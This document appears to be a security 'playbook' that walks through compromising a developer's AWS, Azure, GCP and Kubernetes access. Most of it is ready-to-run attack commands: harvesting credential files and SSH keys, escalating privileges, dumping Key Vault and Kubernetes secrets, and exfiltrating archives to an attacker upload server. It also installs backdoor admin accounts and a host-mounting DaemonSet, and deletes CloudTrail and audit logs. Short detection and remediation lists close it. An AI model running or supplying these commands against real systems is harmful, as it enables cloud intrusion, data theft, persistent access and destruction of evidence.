# Multi-Cloud Developer Account Compromise

## Executive Summary

This playbook documents a sophisticated attack chain where a developer's cloud credentials are compromised, leading to unauthorized access across multiple cloud providers and extraction of sensitive development and production data.

**Attack Complexity**: High  
**Timeline**: 4-8 hours  
**Detection Difficulty**: Very High  
**Business Impact**: Critical - data breach, code theft, infrastructure compromise

---

## Attack Scenario

A developer working on a microservices platform uses AWS, Azure, and GCP for different components. Their local machine credentials are compromised through a trojanized package installed from npm. Attackers systematically leverage this access to:

1. Discover all connected cloud accounts
2. Chain privilege escalations across platforms
3. Access development databases and secrets
4. Exfiltrate source code and intellectual property
5. Install persistent backdoors across all platforms
6. Cover their tracks in audit logs

---

## Phase 1: Initial Access - Local Credential Discovery

### 1.1 Compromised Package Installation

**Attack**: Developer installs trojanized npm package

```bash
# Attacker-controlled package contains malicious dependencies
npm install compromised-package@latest

# Post-install script executes during installation
# This runs with developer's current user context
```

### 1.2 Credential Harvesting from Local Machine

```bash
# Scan for credential files
ls -la ~/.aws/credentials
ls -la ~/.azure/
ls -la ~/.config/gcloud/
ls -la ~/.kube/

# Extract AWS credentials
cat ~/.aws/credentials | grep -A5 default

# Get Azure token cache
find ~/.azure -name "*.json" | xargs cat

# Get GCP service account keys
find ~ -name "*-key.json"

# Extract Kubernetes config
cat ~/.kube/config

# Check environment variables
env | grep -i key
env | grep -i token
env | grep -i secret

# Search git history for credentials
cd ~/Development/project
git log -p | grep -i "password\|key\|secret" | head -20

# Look for credentials in docker configs
cat ~/.docker/config.json

# Check SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```

### 1.3 Discover All Connected Cloud Accounts

```bash
# List all AWS credential profiles
cat ~/.aws/credentials | grep "\["

# Get AWS account IDs
for profile in $(cat ~/.aws/credentials | grep "\[" | tr -d '[]'); do
  echo "Profile: $profile"
  aws sts get-caller-identity --profile $profile
done

# List Azure subscriptions
az account list --output table

# List all Azure tenants the user has access to
az account tenant list

# Get GCP projects
gcloud projects list
gcloud config configurations list

# List Kubernetes clusters
kubectl config get-contexts
```

### 1.4 Identify Primary Attack Targets

```bash
# AWS: Get most active accounts
aws cloudtrail lookup-events --max-results 10 | jq '.Events[] | .Username' | sort | uniq -c

# Azure: Find resource groups with critical resources
az resource list --query "[].resourceGroup" | uniq -c

# GCP: Identify production projects
gcloud projects list --format="value(projectId, labels.env)" | grep production

# Kubernetes: Find production clusters
kubectl config get-contexts | grep -i prod
```

---

## Phase 2: Privilege Escalation - Multi-Cloud Traversal

### 2.1 AWS Account Escalation

```bash
# Use compromised credentials to assume higher-privilege role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/DeveloperToAdmin \
  --role-session-name attacker-session

# Extract temporary credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate assumed account
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# Find overpermissioned role to chaining
aws iam list-attached-user-policies --user-name developer

# Create new access key for persistence
aws iam create-access-key --user-name developer
```

### 2.2 Azure Cross-Tenant Escalation

```bash
# List all accessible tenants
az account tenant list

# Switch to organization tenant
az account set --subscription {org-subscription}

# Find service principals with high privileges
az ad sp list --output json | jq '.[] | select(.displayName | contains("Admin")) | {displayName, appId}'

# Attempt service principal compromise
az ad app credential create --id {appId} --cert @cert.pem

# Create backdoor service principal
az ad sp create-for-rbac --name "DeveloperTools" --role Contributor
```

### 2.3 GCP Organization-Level Escalation

```bash
# Get organization ID
gcloud organizations list

# List all projects in organization
gcloud projects list --filter="parent.id:{ORG_ID}"

# Find service account with compute.admin role
gcloud projects get-iam-policy {PROJECT} --flatten="bindings[].members" \
  --filter="bindings.role:roles/compute.admin"

# Impersonate discovered service account
gcloud iam service-accounts keys create key.json \
  --iam-account={SERVICE_ACCOUNT}@{PROJECT}.iam.gserviceaccount.com

# Use impersonated account to access other projects
gcloud auth activate-service-account --key-file key.json
gcloud config set project {ANOTHER_PROJECT}
```

### 2.4 Kubernetes Cluster Escalation

```bash
# Get all cluster contexts
kubectl config view --flatten

# For each cluster, attempt privilege escalation
for cluster in $(kubectl config get-contexts --no-headers | awk '{print $2}'); do
  kubectl config use-context $cluster
  
  # Check current permissions
  kubectl auth can-i create roles --all-namespaces
  kubectl auth can-i create clusterrolebinding --all-namespaces
  
  # Attempt binding to cluster-admin
  if [ $? -ne 0 ]; then
    # Try to find escalation path
    kubectl get clusterroles | grep -i admin
  fi
done

# Create persistent service account with admin access
kubectl create serviceaccount backdoor -n kube-system
kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin \
  --serviceaccount=kube-system:backdoor

# Extract service account token
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret \
  | grep backdoor | awk '{print $1}')
```

---

## Phase 3: Data Discovery and Assessment

### 3.1 AWS Data Inventory

```bash
# Find all RDS databases
aws rds describe-db-instances --query "DBInstances[].[DBInstanceIdentifier,Engine]" --output table

# Get database credentials from Secrets Manager
aws secretsmanager list-secrets | jq '.SecretList[] | {Name, ARN}'
aws secretsmanager get-secret-value --secret-id prod/database/password

# Find all S3 buckets
aws s3 ls

# Check for public buckets
aws s3api list-buckets --output json | jq '.Buckets[]'
for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
  acl=$(aws s3api get-bucket-acl --bucket $bucket 2>/dev/null)
  if echo "$acl" | grep -q "AllUsers\|AuthenticatedUsers"; then
    echo "PUBLIC: $bucket"
  fi
done

# List all objects in development buckets
aws s3 sync s3://dev-artifacts/ ./exfil/ --no-progress --quiet
aws s3 sync s3://code-releases/ ./exfil/ --no-progress --quiet
```

### 3.2 Azure Data Inventory

```bash
# Find all storage accounts
az storage account list --query "[].name" --output tsv

# Get storage account keys
for account in $(az storage account list --query "[].name" --output tsv); do
  keys=$(az storage account keys list --account-name $account --query "[0].value" --output tsv)
  echo "$account:$keys" >> storage_keys.txt
done

# List blob containers
az storage container list --account-name {account} --auth-mode login

# List SQL databases
az sql server list --query "[].name" --output tsv

# Get connection strings
for server in $(az sql server list --query "[].name" --output tsv); do
  firewall=$(az sql server firewall-rule show --server $server --name AllowAllAzureIps --query allowedEndIpAddress -o tsv 2>/dev/null)
  if [ ! -z "$firewall" ]; then
    echo "Server $server allows Azure services"
  fi
done

# Extract Key Vault secrets
az keyvault list --query "[].name" --output tsv
for vault in $(az keyvault list --query "[].name" --output tsv); do
  az keyvault secret list --vault-name $vault --query "[].name" --output tsv | while read secret; do
    echo "=== $vault/$secret ==="
    az keyvault secret show --vault-name $vault --name $secret --query "value" --output tsv
  done
done
```

### 3.3 GCP Data Inventory

```bash
# Get all BigQuery datasets
bq ls --project_id={PROJECT} | grep "DATASET"

# Export BigQuery tables
for dataset in $(bq ls --project_id={PROJECT} | grep "DATASET" | awk '{print $1}'); do
  for table in $(bq ls --project_id={PROJECT} --dataset_id=$dataset | awk '{print $1}'); do
    bq extract --project_id={PROJECT} $dataset.$table \
      gs://exfil-bucket/$dataset/$table/*.csv
  done
done

# Find all Cloud Storage buckets
gsutil ls

# Download bucket contents
gsutil -m cp -r gs://dev-code-bucket/ ./exfil/

# Find Firestore databases
gcloud firestore databases list

# Export Firestore to Cloud Storage
gcloud firestore export gs://temp-export-bucket/
```

### 3.4 Kubernetes Data Extraction

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Extract secrets from all namespaces
for ns in $(kubectl get ns --no-headers | awk '{print $1}'); do
  for secret in $(kubectl get secrets -n $ns --no-headers | awk '{print $1}'); do
    kubectl get secret $secret -n $ns -o json > $ns-$secret.json
  done
done

# Get database credentials from ConfigMaps
kubectl get configmaps --all-namespaces | grep -i db

# Access etcd directly (if node access gained)
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get --prefix / | jq .
```

---

## Phase 4: Data Exfiltration

### 4.1 Prepare Exfiltration Infrastructure

```bash
# Create attacker-controlled storage
# AWS: Create S3 bucket
aws s3 mb s3://exfil-bucket-{random}
aws s3api put-bucket-versioning --bucket exfil-bucket-{random} \
  --versioning-configuration Status=Suspended

# Azure: Create storage account
az storage account create --name exfilaccount{random} \
  --resource-group {attacker-rg}

# GCP: Create Cloud Storage bucket
gsutil mb gs://exfil-bucket-{random}/

# Kubernetes: Deploy data collection sidecar
kubectl run exfil-collector --image=busybox \
  --command="while true; do cat /var/run/secrets/kubernetes.io/serviceaccount/token; sleep 10; done" \
  -n kube-system
```

### 4.2 Exfiltrate AWS Data

```bash
# Create database snapshot
aws rds create-db-snapshot --db-instance-identifier prod-database \
  --db-snapshot-identifier exfil-snapshot

# Make snapshot shareable
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil-snapshot \
  --attribute-name restore --values-to-add 123456789012

# Download S3 data
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3 sync s3://$bucket ./exfil/$bucket/ --quiet
done

# Export DynamoDB
aws dynamodb scan --table-name important-table --output json > table-data.json

# Export Lambda function code
for function in $(aws lambda list-functions --query "Functions[].FunctionName" --output text); do
  aws lambda get-function --function-name $function | \
    jq -r '.Code.Location' | xargs curl -o $function.zip
done
```

### 4.3 Exfiltrate Azure Data

```bash
# Download SQL database
sqlcmd -S {server}.database.windows.net -U {user} -P {password} \
  -d {database} -Q "SELECT * FROM important_table" > db_dump.txt

# Copy blob storage
for account in $(az storage account list --query "[].name" --output tsv); do
  for container in $(az storage container list --account-name $account --query "[].name" --output tsv); do
    az storage blob download-batch --source $container \
      --destination ./exfil/$account/$container --account-name $account
  done
done

# Export Key Vault
for vault in $(az keyvault list --query "[].name" --output tsv); do
  az keyvault secret list --vault-name $vault --query "[].name" --output tsv | while read secret; do
    value=$(az keyvault secret show --vault-name $vault --name $secret --query "value" --output tsv)
    echo "$vault/$secret=$value" >> secrets.txt
  done
done
```

### 4.4 Exfiltrate GCP Data

```bash
# Export BigQuery data
for dataset in $(bq ls --project_id={PROJECT} | grep DATASET | awk '{print $1}'); do
  bq extract --project_id={PROJECT} --destination_format=JSON \
    {PROJECT}:$dataset.* gs://exfil-bucket/$dataset/*.json
done

# Copy Cloud Storage
gsutil -m cp -r gs://sensitive-data/ gs://exfil-bucket/

# Export Firestore
gcloud firestore export gs://exfil-bucket/firestore/

# Get database backups
gcloud sql backups list --instance={INSTANCE} | awk '{print $1}' | while read backup; do
  gsutil cp gs://sql-backups/$backup ./exfil/
done
```

### 4.5 Upload to Attacker Infrastructure

```bash
# Create encrypted archive
tar czf - exfil/ | openssl enc -aes-256-cbc -out exfil.tar.gz.enc

# Upload to attacker S3
aws s3 cp exfil.tar.gz.enc s3://attacker-bucket/exfil-$(date +%s).enc

# Or upload via secure channel
curl -X POST -F "file=@exfil.tar.gz.enc" https://attacker-exfil-server/upload

# Verify upload
aws s3 ls s3://attacker-bucket/ | grep exfil
```

---

## Phase 5: Persistence Installation

### 5.1 AWS Persistence

```bash
# Create IAM user for long-term access
aws iam create-user --user-name "automation-bot"

# Create access keys
aws iam create-access-key --user-name "automation-bot"

# Attach high-privilege policy
aws iam attach-user-policy --user-name "automation-bot" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create Lambda for continuous exfiltration
aws lambda create-function --function-name "system-audit" \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/service-role/lambda-role \
  --handler index.handler \
  --zip-file fileb://backdoor.zip

# Schedule regular execution
aws events put-rule --name "daily-audit" --schedule-expression "cron(0 2 * * ? *)"
```

### 5.2 Azure Persistence

```bash
# Create service principal
az ad sp create-for-rbac --name "maintenance-agent" --role Owner

# Create application secret with long expiration
az ad app credential create --id {appId} \
  --end-date 2099-12-31

# Install web job
az webapp deployment slot create --resource-group {rg} --name {app} --slot production

# Deploy backdoor code
zip -r backdoor.zip index.js package.json
az webapp deployment source config-zip --resource-group {rg} \
  --name {app} --src-path backdoor.zip
```

### 5.3 GCP Persistence

```bash
# Create service account
gcloud iam service-accounts create persistent-agent \
  --display-name="Maintenance Agent"

# Grant admin role
gcloud projects add-iam-policy-binding {PROJECT} \
  --member="serviceAccount:persistent-agent@{PROJECT}.iam.gserviceaccount.com" \
  --role="roles/owner"

# Create and store key
gcloud iam service-accounts keys create key.json \
  --iam-account=persistent-agent@{PROJECT}.iam.gserviceaccount.com

# Schedule Cloud Function
gcloud functions deploy persistent-worker \
  --runtime python39 \
  --trigger-topic "projects/{PROJECT}/topics/persistent-trigger"

# Create Cloud Scheduler job
gcloud scheduler jobs create pubsub daily-worker \
  --schedule="0 2 * * *" \
  --topic="persistent-trigger"
```

### 5.4 Kubernetes Persistence

```bash
# Create privileged service account
kubectl create serviceaccount persistent-admin -n kube-system
kubectl create clusterrolebinding persistent-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:persistent-admin

# Deploy DaemonSet for node access
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: persistence-daemon
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: persistence-daemon
  template:
    metadata:
      labels:
        app: persistence-daemon
    spec:
      serviceAccountName: persistent-admin
      containers:
      - name: backdoor
        image: attacker-registry/backdoor:latest
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
EOF

# Create webhook for code injection
kubectl create secret generic webhook-secret \
  --from-literal=secret={webhook-token} -n kube-system
```

---

## Phase 6: Cover Tracks

### 6.1 AWS Log Deletion

```bash
# Delete CloudTrail logs
aws cloudtrail stop-logging --name {trail-name}
aws s3 rm s3://cloudtrail-logs/ --recursive

# Clear CloudWatch logs
aws logs describe-log-groups --query 'logGroups[].logGroupName' --output text | \
  while read lg; do
    aws logs delete-log-group --log-group-name "$lg"
  done

# Delete VPC flow logs
aws ec2 describe-flow-logs --query 'FlowLogs[].FlowLogId' --output text | \
  while read id; do
    aws ec2 delete-flow-logs --flow-log-ids "$id"
  done
```

### 6.2 Azure Audit Log Cleanup

```bash
# Check if Activity Log data is sent to Log Analytics
az monitor diagnostic-settings list --resource /subscriptions/{sub}/resourceGroups/{rg} \
  --query "[].name" --output tsv | xargs az monitor diagnostic-settings delete

# Delete from Log Analytics
az monitor log-analytics workspace delete --resource-group {rg} --workspace-name {workspace}

# Remove audit logs
az monitor activity-log list --query "[].id" --output tsv | \
  xargs -I {} az monitor activity-log delete --ids "{}"
```

### 6.3 GCP Log Deletion

```bash
# Delete Cloud Audit logs
gcloud logging read --filter 'protoPayload.methodName="storage.buckets.get"' \
  --format json | jq -r '.[] | .insertId' | \
  xargs -I {} gcloud logging delete-logs {}.

# Clear Stackdriver logs
gcloud logging logs delete projects/{PROJECT}/logs/activity

# Disable audit logging
gcloud projects update {PROJECT} \
  --remove-iam-policy-binding=projects/{PROJECT}/roles/logging.viewer
```

### 6.4 Kubernetes Audit Log Removal

```bash
# Remove audit logs from etcd
kubectl exec -n kube-system etcd-{node} -- \
  sh -c 'etcdctl --endpoints=127.0.0.1:2379 del /audit-logs --recursive'

# Delete pod logs
kubectl logs {pod} -n {namespace} --timestamps=false > /dev/null

# Clear kubelet logs
ssh {node} 'rm -rf /var/log/kubelet.log*'
```

---

## Detection Indicators

**What defenders should look for:**

1. **Multiple cloud CLI tools** running with unusual combinations
2. **Cross-platform credential usage** (using AWS creds in Azure, etc.)
3. **Bulk data exports** from databases, storage, or Kubernetes
4. **Persistence installation** (backdoor users/roles/service accounts)
5. **Audit log deletions** or disablement across platforms
6. **Unusual API calls** from developer machines at off-hours
7. **New service principals/accounts** with high privileges
8. **Credential rotation** skipped by service accounts

---

## Remediation

1. Revoke all compromised credentials immediately
2. Force password reset for all users with cloud access
3. Audit all cloud infrastructure changes in past 30 days
4. Review all data access logs for exfiltration
5. Scan code repositories for secrets
6. Rotate all stored secrets and API keys
7. Review and restrict cross-account/cross-project access
8. Enable mandatory MFA for all cloud accounts
9. Implement proper audit logging with immutable storage
10. Conduct forensic analysis of affected systems

